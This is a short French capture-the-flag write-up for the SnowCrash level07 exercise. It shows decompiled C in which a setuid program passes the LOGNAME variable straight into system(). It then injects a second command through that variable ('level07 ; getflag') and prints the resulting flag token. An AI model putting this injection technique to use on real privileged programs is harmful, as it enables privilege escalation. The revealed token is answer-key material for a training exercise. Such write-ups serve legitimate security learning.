@@ -1,0 +1,40 @@
+On recupere l'executable et on le decompile avec retdec.com, ce qui nous donne:
+
+#include <stdint.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+// ------------------------ Functions -------------------------
+
+// From module:   /home/user/level07/level07.c
+// Address range: 0x8048514 - 0x80485af
+// Line range:    6 - 24
+int main(int argc, char ** argv) {
+    // 0x8048514
+    char * v1;
+    char * buffer = v1; // bp-28
+    int32_t v2;
+    int32_t gid = v2; // bp-24
+    int32_t v3;
+    int32_t uid = v3; // bp-20
+    gid = getegid();
+    uid = geteuid();
+    setresgid(gid, gid, gid);
+    setresuid(uid, uid, uid);
+    buffer = NULL;
+    char * env_val = getenv("LOGNAME"); // 0x8048576
+    asprintf(&buffer, "/bin/echo %s ", env_val);
+    return system(buffer);
+}
+
+La faille est expliquer ici: http://codereview.stackexchange.com/questions/6435/c-system-function-vulnerability
+Il suffit donc de faire:
+export LOGNAME="level07 ; getflag"
+ce qui va donner dans le call a system: system(/bin/echo level07; getflag)
+ce qui donne:
+level07@SnowCrash:~$ export LOGNAME="level07 ; getflag"
+level07@SnowCrash:~$ ./level07
+level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+Voila!
